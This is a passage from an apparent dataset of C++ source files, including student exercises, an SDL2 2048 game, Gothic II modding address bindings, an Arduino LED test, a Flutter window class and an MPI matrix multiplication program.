quickSort(P, l, pivot - 1, type, k, logFile, v);\n            quickSort(P, pivot + 1, h, type, k, logFile, v);\n        }\n    }\n}\n\nvoid write_file(const vector<population_data> &P, const string &filename)\n{\n    ofstream file(filename);\n    for (const auto &data : P)\n    {\n        file << data.city << \";\" << data.population << \"\\n\";\n    }\n}\n\nint main(int argc, char **argv)\n{\n    \n    string filename = argv[1];\n    string type = argv[2];\n    int k = stoi(argv[3]);\n    string output_file = argv[4];\n    bool verbose;\n    if (argc > 4 && string(argv[4]) == \"v\")\n    {\n        verbose = true;\n    }\n    else\n    {\n        verbose = false;\n    }\n    \n   /*\n    string filename = \"dummyData.csv\";\n    string type = \"r\";\n    int k = 6;\n    string output_file = \"abc.csv\";\n    bool verbose = true;\n    if (argc > 4 && string(argv[4]) == \"v\")\n    {\n        verbose = true;\n    }\n    else\n    {\n        verbose = false;\n    }\n    */\n    cout << type << k << output_file << verbose;\n\n    vector<pop",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Deklarasi variabel\r\n    string nama_siswa;\r\n    float nilai_keaktifan, nilai_tugas, nilai_ujian;\r\n    float nilai_murni_keaktifan, nilai_murni_tugas, nilai_murni_ujian;\r\n    float nilai_akhir;\r\n\r\n    // Masukkan data siswa\r\n    cout << \"Masukkan nama siswa: \";\r\n    getline(cin, nama_siswa);\r\n\r\n    cout << \"Masukkan nilai keaktifan: \";\r\n    cin >> nilai_keaktifan;\r\n\r\n    cout << \"Masukkan nilai tugas: \";\r\n    cin >> nilai_tugas;\r\n\r\n    cout << \"Masukkan nilai ujian: \";\r\n    cin >> nilai_ujian;\r\n\r\n    // Hitung nilai murni\r\n    nilai_murni_keaktifan = nilai_keaktifan * 0.2;\r\n    nilai_murni_tugas = nilai_tugas * 0.5;\r\n    nilai_murni_ujian = nilai_ujian * 0.3;\r\n\r\n    // Hitung nilai akhir\r\n    nilai_akhir = nilai_murni_keaktifan + nilai_murni_tugas + nilai_murni_ujian;\r\n\r\n    // Tampilkan nama siswa dan nilai akhir\r\n    cout << \"Nama siswa: \" << nama_siswa << endl;\r\n    cout << \"Nilai akhir: \" << nilai_akhir << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include<bits/stdc++.h>\r\n#include<SDL2/SDL.h>\r\n#include<SDL2/SDL_image.h>\r\n#include<SDL2/SDL_ttf.h>\r\n\r\n#include\"class.h\"\r\n#include\"board.h\"\r\n#include\"useForAll.h\"\r\n#include\"loseAndWin.h\"\r\n#include\"newGameButton.h\"\r\n#include\"score.h\"\r\n\r\nusing namespace std; \r\n\r\n\r\nvoid start()\r\n{\r\n    setUpBoard();\r\n\r\n    block0.val = 0;\r\n    block0.update();\r\n\r\n    generate();\r\n    drawBoard();\r\n    updateBoard();\r\n\r\n    SDL_Event e;\r\n    bool quit = 0;\r\n    while(!quit)\r\n    {\r\n        while(SDL_PollEvent(&e))\r\n        {\r\n            if(e.type == SDL_QUIT) \r\n            {\r\n                quit = 1;\r\n                lBest.save();\r\n            }\r\n            checkLose();\r\n            blockMovement(e);\r\n            newButton.event(e);\r\n        }\r\n\r\n        if(restart) makeNewGame();\r\n        drawBoard();\r\n        updateBoard();\r\n\r\n        if(!lose) SDL_RenderPresent(gRenderer);\r\n        else printLoseScreen(); \r\n    }\r\n}\r\n\r\n\r\nvoid init()\r\n{\r\n    if(SDL_Init(SDL_INIT_EVERYTHING)) cout << \"fail\";\r\n    gWindow = SDL_CreateWindow(\"2048\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, \r\n                                WINDOW_WIDTH, WINDOW_HEIGHT, SDL_WINDOW_SHOWN);\r\n    \r\n    gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED|SDL_RENDERER_PRESENTVSYNC);\r\n    IMG_Init(IMG_INIT_PNG);\r\n    TTF_Init();\r\n}\r\n\r\n\r\nvoid close()\r\n{\r\n    SDL_Quit();\r\n    IMG_Quit();\r\n    TTF_Quit();\r\n}\r\n\r\n\r\nvoid loadMedia()\r\n{\r\n    SDL_Surface* tmpSurface = NULL;\r\n    for(int i = 0; i <= 10; i++)\r\n    {\r\n        stringstream s(\"\");\r\n        s << \"images/\" << (1 << i) << \".png\";\r\n        tmpSurface = IMG_Load(s.str().c_str());\r\n\r\n        value[i] = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n    }\r\n\r\n    tmpSurface = IMG_Load(\"images/background.png\");\r\n    background = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n\r\n    SDL_FreeSurface(tmpSurface);\r\n\r\n\r\n    loadLoseAndWinScreen();\r\n    newButton.imgLoad();\r\n    lBest.imgLoad(\"images/best.png\");\r\n    lScore.imgLoad(\"images/score.png\");\r\n\r\n\r\n    font = TTF_OpenFont(\"images/font1.ttf\", 35);\r\n\r\n    ifstream getBestScore(\"images/scoreSave.txt\");\r\n    getBestScore >> best;\r\n    getBestScore.close();\r\n}\r\n\r\n\r\nint main(int argv, char* argc[])\r\n{\r\n    srand(time(0));\r\n    init();\r\n    loadMedia();\r\n\r\n    start();\r\n    close();\r\n\r\n    return 0;\r\n}",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include \"Date.h\"\r\n\r\nDate::Date(int year, int month, int day)\r\n{\r\n\t_year = year;\r\n\t_month = month;\r\n\t_day = day;\r\n}\r\nDate::Date(const Date& d)\r\n{\r\n\t_year = d._year;\r\n\t_month = d._month;\r\n\t_day = d._day;\r\n}\r\nbool Date::operator==(const Date& d)\r\n{\r\n\treturn _year == d._year &&\r\n\t\t_month == d._month &&\r\n\t\t_day == d._day;\r\n}\r\nvoid Date::print() const\r\n\t{\r\n\t\tcout << _year << \"-\" << _month << \"-\" << _day<<endl;\r\n\t}\r\nDate Date:: operator++(int n)\r\n{\r\n\tDate temp(*this);\r\n\t*this += 1;\r\n\treturn temp;\r\n}\r\nDate& Date::operator+=(int n)\r\n{\r\n\tthis->_day += n;\r\n\twhile (this->_day > GetMonthDay(this->_year, this->_month))\r\n\t{\r\n\t\tthis->_day -= GetMonthDay(this->_year, this->_month);\r\n\t\tthis->_month++;\r\n\t\tif (this->_month == 13)\r\n\t\t{\r\n\t\t\tthis->_year++;\r\n\t\t\tthis->_month = 1;\r\n\t\t}\r\n\t}\r\n\treturn *this;\r\n}\r\nbool Date::operator!= (Date& d)\r\n{\r\n\treturn !(*this == d);\r\n}\r\nint Date::GetMonthDay(int year, int month)\r\n{\r\n\tstatic int MonthDay[13] = { 0,31,28,31,30,31,30,31,31,30,31,30,31 };\r\n\tif (year >= 0 && ((year % 4 == 0 && year % 100 != 0) || year % 400 == 0) && month == 2)\r\n\t{\r\n\t\treturn 29;\r\n\t}\r\n\treturn MonthDay[month];\r\n}\r\nbool Date::operator<(const Date& d)\r\n{\r\n\tif (_year < d._year)\r\n\t\treturn true;\r\n\telse\r\n\t\tif (_year == d._year && _month < d._month)\r\n\t\t\treturn true;\r\n\t\telse\r\n\t\t\tif (_year == d._year && _month == d._month && _day < d._day)\r\n\t\t\t\treturn true;\r\n\r\n\treturn false;\r\n}\r\nint  Date::operator-(Date& d)\r\n{\r\n\tDate max = *this;\r\n\tDate min = d;\r\n\tint flag = 1;\r\n\tif (*this < d)\r\n\t{\r\n\t\tmax = d;\r\n\t\tmin = *this;\r\n\t\tflag = -1;\r\n\t}\r\n\tint n = 0;\r\n\twhile (max!=min)\r\n\t{\r\n\t\tmin++;\r\n\t\tn++;\r\n\t}\r\n\treturn n*flag;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat\n{\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa \n{\n    string nim;\n    string nama;\n    DetailAlamat alamat; \n    int umur; \n};\n\nint main()\n{\n    Mahasiswa mhs[3];\n    for (int i=0;i<3;i++){\n        cout << \"Data ke-\" << (i+1)<<\":\"<<endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout <<\"Nama Mahasiswa: \";\n        getline(cin,mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" <<endl;\n        cout << \"\\t Nama Desa: \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota: \";\n        cin >> mhs[i].alamat.kota;\n\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1,'/n');\n        cout<<endl;\n    }\n    for (int i=0;i<3;i++){\n        cout << endl;\n        cout << \"Data mahasiswa ke-\" <<(i+1)<<\":\"<<endl;\n        cout <<\"\\n NIM: \"<<mhs[i].nim;\n        cout << \"\\n Nama: \"<< mhs[i].nama;\n        cout << \"\\n Alamat: \";\n        cout << \"\\n Desa: \"<< mhs[i].alamat.desa;\n        cout << \"\\n Kota: \"<< mhs[i].alamat.kota;\n        cout << \"\\n Umur: \"<< mhs[i].umur;\n        cout << endl;\n    }\n}",
    "#include <iostream>\n#include <string>\nusing namespace  std;\n\nstruct DetailAlamat {\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa {\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\n\nint main()\n{\n    Mahasiswa mhs[3];\n    for(int i = 0; i < 3; i++) {\n        cout << \"Data ke-\" << (i + 1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin, mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\t Nama Desa : \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota : \";\n        cin >> mhs[i].alamat.kota;\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1,'\\n');\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++) {\n        cout << endl;\n        cout << \"Data Mahasiswa ke-\" << (i + 1) << \":\" << endl;\n        cout << \"\\n NIM : \" << mhs[i].nim;\n        cout << \"\\n Nama : \" << mhs[i].nama;\n        cout << \"\\n Alamat : \";\n        cout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n        cout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur : \" << mhs[i].umur;\n    }\n}",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_II_Classic {\n#ifdef __ZPROTO_B_VER2__\n  zCEngine*&             zengine          = *(zCEngine**)            0x008B439C;\n  zCOption*&             zoptions         = *(zCOption**)            0x008BF378;\n  zCOption*&             zgameoptions     =  zoptions;\n  zCTimer*               ztimer           =  (zCTimer*)              0x00974C7C;\n  oCGame*&               ogame            = *(oCGame**)              0x009813DC;\n  zCInput*&              zinput           = *(zCInput**)             0x008C2FF8;\n  zCRenderer*&           zrenderer        = *(zCRenderer**)          0x0095C7B8;\n  zCLineCache*           zlineCache       =  (zCLineCache*)          0x008C5CC0;\n  zERROR*                zerr             =  (zERROR*)               0x008BF6B8;\n  zCSoundSystem*&        zsound           = *(zCSoundSystem**)       0x009748E4;\n  zCMusicSystem*&        zmusic           = *(zCMusicSystem**)       0x008C38B4;\n  oCItem*&               offer            = *(oCItem**)              0x00981048;\n  oCDoc*&                document         = *(oCDoc**)               0x00981128;\n  zCMallocGeneric*       zmalloc          =  (zCMallocGeneric*)      0x008CA0F8;\n  zTEngineStats*         zengineStats     =  (zTEngineStats*)        0x008C5D0C;\n  zCScanDir*             dirScanner       =  (zCScanDir*)            0x008BF41C;\n  oCObjectFactory*&      zfactory         = *(oCObjectFactory**)     0x008CA720;\n  zCArchiverFactory*     zarcFactory      =  (zCArchiverFactory*)    0x008C60F4;\n  oCNpc*&                player           = *(oCNpc**)               0x009831DC;\n  oCNpc*&                stealnpc         = *(oCNpc**)               0x00983324;\n  zCVob*&                speaker          = *(zCVob**)               0x008C07F4;\n  zCVob*&                listener         = *(zCVob**)               0x008C07F8;\n  zCView*&               screen           = *(zCView**)              0x00985FB0;\n  zCView*&               messages         = *(zCView**)              0x008C2B64;\n  zCConsole*             zcon             =  (zCConsole*)            0x009843A8;\n  zCConsole*&            game_species_con = *(zCConsole**)           0x009813F0;\n  zCConsole*&            game_fight_con   = *(zCConsole**)           0x009813F4;\n  zCConsole*&            edit_con         = *(zCConsole**)           0x009813F8;\n  zCConsole*&            game_cam_con     = *(zCConsole**)           0x009813FC;\n  zCConsole*&            game_aiConsole   = *(zCConsole**)           0x00981400;\n  zCNet*&                znet             = *(zCNet**)               0x008BA9D0;\n  zCNetManager*&         znetman          = *(zCNetManager**)        0x008BEC90;\n  CGameManager*&         gameMan          = *(CGameManager**)        0x008B4398;\n  zCFontMan*&            zfontman         = *(zCFontMan**)           0x0098451C;\n  oCRtnManager*          rtnMan           =  (oCRtnManager*)         0x00983D10;\n  oCMissionManager*      misMan           =  (oCMissionManager*)     0x00981ED8;\n  zCRenderManager*       zrenderMan       =  (zCRenderManager*)      0x009742F8;\n  zCResourceManager*&    zresMan          = *(zCResourceManager**)   0x009743E0;\n  zCSoundManager*&       zsndMan          = *(zCSoundManager**)      0x00974958;\n  zCVertexBufferManager* zvertexBufferMan =  (zCVertexBufferManager*)0x009A341C;\n  zCParser*              parser           =  (zCParser* )            0x00984C08;\n  zCParser*&             parserSoundFX    = *(zCParser**)            0x008C442C;\n  zCParser*&             parserParticleFX = *(zCParser**)            0x008CAB60;\n  zCParser*&             parserVisualFX   = *(zCParser**)            0x008C008C;\n  zCParser*&             parserCamera     = *(zCParser**)            0x008C0468;\n  zCParser*&             parserMenu       = *(zCParser**)            0x008C3808;\n  zCParser*&             parserMusic      = *(zCParser**)            0x008C3AF4;\n  zCFPUControler*        zfpuControler    =  (zCFPUControler*)       0x00974CA4;\n  oCParticleControl*&    pfxc             = *(oCParticleControl**)   0x009813E4;\n  HINSTANCE&             hInstApp         = *(HINSTANCE*)            0x008C5BE8;\n  HDC&                   dcScreen         = *(HDC*)                  0x008C5BEC;\n  HICON&                 hIconApp         = *(HICON*)                0x008C5BF0;\n  HWND&                  hWndApp          = *(HWND*)                 0x008C5BF4;\n\n  namespace Gothic {\n    namespace Managers {\n      CGameManager*&          Game         = gameMan;\n      zCFontMan*&             Font         = zfontman;\n      oCRtnManager*&          Routine      = rtnMan;\n      oCMissionManager*&      Mission      = misMan;\n      zCRenderManager*&       Render       = zrenderMan;\n      zCResourceManager*&     Resource     = zresMan;\n      zCSoundManager*&        Sound        = zsndMan;\n      zCVertexBufferManager*& VertexBuffer = zvertexBufferMan;\n    }\n\n    namespace Parsers {\n      zCParser*& Game   = parser;\n      zCParser*& SFX    = parserSoundFX;\n      zCParser*& PFX    = parserParticleFX;\n      zCParser*",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_II_Classic {\n#ifdef __OCS_MANAGER_H__VER2__\n  zCClassDef* oCCSManager::classDef                 = (zCClassDef*)0x008B37F0;\n#endif\n#ifdef __OCS_PLAYER_H__VER2__\n  zCClassDef* oCCSPlayer::classDef                  = (zCClassDef*)0x008B39D0;\n#endif\n#ifdef __OCS_PROPS_H__VER2__\n  zCClassDef* oCCSProps::classDef                   = (zCClassDef*)0x008B3A70;\n#endif\n#ifdef __OCS_TRIGGER_H__VER2__\n  zCClassDef* oCCSTrigger::classDef                 = (zCClassDef*)0x008B3AE8;\n#endif\n#ifdef __ZCCS_CONTEXT_H__VER2__\n  zCClassDef* zCCSCutsceneContext::classDef         = (zCClassDef*)0x008B3B60;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCEvMsgCutscene::classDef             = (zCClassDef*)0x008B3BD0;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCSBlock::classDef                   = (zCClassDef*)0x008B3C48;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCSSyncBlock::classDef               = (zCClassDef*)0x008B3CB8;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCSAtomicBlock::classDef             = (zCClassDef*)0x008B3D28;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCutscene::classDef                  = (zCClassDef*)0x008B3D98;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCSBlockBase::classDef               = (zCClassDef*)0x008B3E58;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER2__\n  zCClassDef* zCCSRole::classDef                    = (zCClassDef*)0x008B3EC8;\n#endif\n#ifdef __ZCCS_LIB_H__VER2__\n  zCClassDef* zCCSLib::classDef                     = (zCClassDef*)0x008B3F40;\n#endif\n#ifdef __ZCCS_MANAGER_H__VER2__\n  zCClassDef* zCCSManager::classDef                 = (zCClassDef*)0x008B3FC8;\n#endif\n#ifdef __ZCCS_PLAYER_H__VER2__\n  zCClassDef* zCCSPlayer::classDef                  = (zCClassDef*)0x008B4048;\n#endif\n#ifdef __ZCCS_POOL_H__VER2__\n  zCClassDef* zCCSPoolItem::classDef                = (zCClassDef*)0x008B40C0;\n#endif\n#ifdef __ZCCS_PROPS_H__VER2__\n  zCClassDef* zCCSProps::classDef                   = (zCClassDef*)0x008B4138;\n#endif\n#ifdef __OSAVEGAME_H__VER2__\n  zCClassDef* oCSavegameInfo::classDef              = (zCClassDef*)0x008B4788;\n#endif\n#ifdef __OTRIGGER_H__VER2__\n  zCClassDef* oCTriggerScript::classDef             = (zCClassDef*)0x008B4888;\n#endif\n#ifdef __OTRIGGER_H__VER2__\n  zCClassDef* oCTriggerChangeLevel::classDef        = (zCClassDef*)0x008B4980;\n#endif\n#ifdef __ZNET_EVENT_MAN_H__VER2__\n  zCClassDef* zCNetEventManager::classDef           = (zCClassDef*)0x008BEB20;\n#endif\n#ifdef __ZNET_MANAGER_H__VER2__\n  zCClassDef* zCNetManager::classDef                = (zCClassDef*)0x008BEC10;\n#endif\n#ifdef __ZNET_VOB_CONTROL_H__VER2__\n  zCClassDef* zCNetVobControl::classDef             = (zCClassDef*)0x008BED28;\n#endif\n#ifdef __OSPELL_H__VER2__\n  zCClassDef* oCSpell::classDef                     = (zCClassDef*)0x008BFED0;\n#endif\n#ifdef __OVIS_FX_H__VER2__\n  zCClassDef* oCVisualFX::classDef                  = (zCClassDef*)0x008BFFF8;\n#endif\n#ifdef __OVIS_FX__MULTI_TARGET_H__VER2__\n  zCClassDef* oCVisFX_MultiTarget::classDef         = (zCClassDef*)0x008C0198;\n#endif\n#ifdef __ZAI_CAMERA_H__VER2__\n  zCClassDef* zCAICamera::classDef                  = (zCClassDef*)0x008C02F0;\n#endif\n#ifdef __ZCS_CAMERA_H__VER2__\n  zCClassDef* zCCSCamera_EventMsg::classDef         = (zCClassDef*)0x008C28E0;\n#endif\n#ifdef __ZCS_CAMERA_H__VER2__\n  zCClassDef* zCCSCamera::classDef                  = (zCClassDef*)0x008C2960;\n#endif\n#ifdef __ZCS_CAMERA_H__VER2__\n  zCClassDef* zCCamTrj_KeyFrame::classDef           = (zCClassDef*)0x008C29D0;\n#endif\n#ifdef __ZCS_CAMERA_H__VER2__\n  zCClassDef* zCCSCamera_EventMsgActivate::classDef = (zCClassDef*)0x008C2A40;\n#endif\n#ifdef __ZAI_H__VER2__\n  zCClassDef* zCAIBase::classDef                    = (zCClassDef*)0x008C5D90;\n#endif\n#ifdef __ZAI_H__VER2__\n  zCClassDef* zCAIBaseSound::classDef               = (zCClassDef*)0x008C5E00;\n#endif\n#ifdef __ZAI_PLAYER_H__VER2__\n  zCClassDef* zCAIPlayer::classDef                  = (zCClassDef*)0x008C5F00;\n#endif\n#ifdef __ZARCHIVER_H__VER2__\n  zCClassDef* zCArchiver::classDef                  = (zCClassDef*)0x008C6020;\n#endif\n#ifdef __ZARCHIVER2_H__VER2__\n  zCClassDef* zCArchiverBinSafe::classDef           = (zCClassDef*)0x008C6180;\n#endif\n#ifdef __ZARCHIVER_GENERIC_H__VER2__\n  zCClassDef* zCArchiverGeneric::classDef           = (zCClassDef*)0x008C6278;\n#endif\n#ifdef __ZVISUAL_H__VER2__\n  zCClassDef* zCDecal::classDef                     = (zCClassDef*)0x008C9E30;\n#endif\n#ifdef __ZLENSFLARE_H__VER2__\n  zCClassDef* zCLensFlareFX::classDef               = (zCClassDef*)0x008C9F78;\n#endif\n#ifdef __ZMATERIAL_H__VER2__\n  zCClassDef* zCMaterial::classDef                  = (zCClassDef*)0x008CA088;\n#endif\n#ifdef __ZVISUAL_H__VER2__\n  zCClassDef* zCMesh::classDef                      = (zCClassDef*)0x008CA148;\n#endif\n#ifdef __ZMODEL_H__VER2__\n  zCClassDef* zCModelAni::classDef                  = (zCClassDef*)0x008CA218;\n#endif\n#ifdef __ZMODEL_H__VER2__\n  zCClassDef* zCModel::classDef  ",
    "/**\n * @file led_test.cpp\n * @author Faroch Mehri (faroch.mehri@ya.se)\n * @brief Using unity to test the built in LED.\n * @version 0.1\n * @date 2021-05-22\n *\n * @copyright Copyright (c) 2021\n *\n */\n\n#include <unity.h>\n#include <Arduino.h>\n\n#define DELAY 500U\n#define MAX_BLINKS 5U\n\nvoid test_led_builtin_pin_number(void)\n{\n    TEST_ASSERT_EQUAL(13, LED_BUILTIN);\n}\n\nvoid test_led_state_high(void)\n{\n    digitalWrite(LED_BUILTIN, HIGH);\n    TEST_ASSERT_EQUAL(HIGH, digitalRead(LED_BUILTIN));\n}\n\nvoid test_led_state_low(void)\n{\n    digitalWrite(LED_BUILTIN, LOW);\n    TEST_ASSERT_EQUAL(LOW, digitalRead(LED_BUILTIN));\n}\n\nvoid setup()\n{\n    delay(2000); // Wait 2 seconds for getting the USB serial ready\n\n    UNITY_BEGIN();\n\n    RUN_TEST(test_led_builtin_pin_number);\n    pinMode(LED_BUILTIN, OUTPUT);\n\n    for (uint8_t i = 0; i < MAX_BLINKS; i++)\n    {\n        RUN_TEST(test_led_state_high);\n        delay(DELAY);\n\n        RUN_TEST(test_led_state_low);\n        delay(DELAY);\n    }\n\n    UNITY_END();\n}\n\nvoid loop()\n{\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include <iostream>\r\n#include <random>\r\n#include \"mpi.h\"\r\n#include <chrono>\r\n\r\n#define N 4 // \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u0430 N \u0434\u043b\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0445 \u043c\u0430\u0442\u0440\u0438\u0446\r\n\r\nusing namespace std;\r\n\r\nvoid print_matrix(int m[N][N], string name) {\r\n    cout << name << \" = \" << endl;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            cout << \" \" << m[i][j] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n    int rank, numtasks;\r\n    MPI_Init(&argc, &argv);\r\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\r\n    MPI_Comm_size(MPI_COMM_WORLD, &numtasks);\r\n\r\n    // \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u0435\u043b\r\n    random_device rd;\r\n    mt19937 gen(rd() + rank);\r\n    uniform_int_distribution<int> dis(1, 1000);\r\n\r\n    int a[N][N];\r\n    int b[N][N];\r\n    int c[N][N];\r\n    int aa[N], cc[N];\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    // \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u0441\u043b\u0443\u0447 \u0447\u0438\u0441\u043b\u0430\u043c\u0438\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            a[i][j] = dis(gen);\r\n            b[i][j] = dis(gen);\r\n        }\r\n    }\r\n\r\n    MPI_Scatter(a, N * N / numtasks, MPI_INT, aa, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n    MPI_Bcast(b, N * N, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto start = chrono::steady_clock::now();\r\n\r\n    //\u043f\u0435\u0440\u0435\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\r\n    int sum = 0;\r\n    for (int i = 0; i < N; i++) {\r\n        for (int j = 0; j < N; j++) {\r\n            sum += aa[j] * b[j][i];\r\n        }\r\n        cc[i] = sum;\r\n        sum = 0;\r\n    }\r\n\r\n    MPI_Gather(cc, N * N / numtasks, MPI_INT, c, N * N / numtasks, MPI_INT, 0, MPI_COMM_WORLD);\r\n\r\n    MPI_Barrier(MPI_COMM_WORLD);\r\n\r\n    auto end = chrono::steady_clock::now();\r\n    if (rank == 0) {\r\n        auto duration = chrono::duration_cast<chrono::duration<double>>(end - start);\r\n        cout << \"time:  \" << duration.count() << \" seconds\" << endl;\r\n        print_matrix(a, \"A\");\r\n        print_matrix(b, \"B\");\r\n        print_matrix(c, \"C\");\r\n    }\r\n\r\n    MPI_Finalize();\r\n}\r\n",
    "/*\u0412\u0430\u0440\u0438\u0430\u043d\u0442 \u2116 3\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0432\u0430\u0434\u0440\u0430\u0442\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043f\u043e\u043b\u0435, \u0437\u0430\u0434\u0430\u044e\u0449\u0435\u0435 \u0434\u043b\u0438\u043d\u0443 \u0441\u0442\u043e\u0440\u043e\u043d\u044b (\u0441\u0442\u0430\u0442\u0443\u0441 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 protected);\n\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0435\u0447\u0430\u0442\u0438 \u043f\u043e\u043b\u044f \u0438 \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430.\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0443\u0431\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f;\n\u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043c\u0430 \u043a\u0443\u0431\u0430 (\u0432\u043c\u0435\u0441\u0442\u043e \u043f\u043b\u043e\u0449\u0430\u0434\u0438) 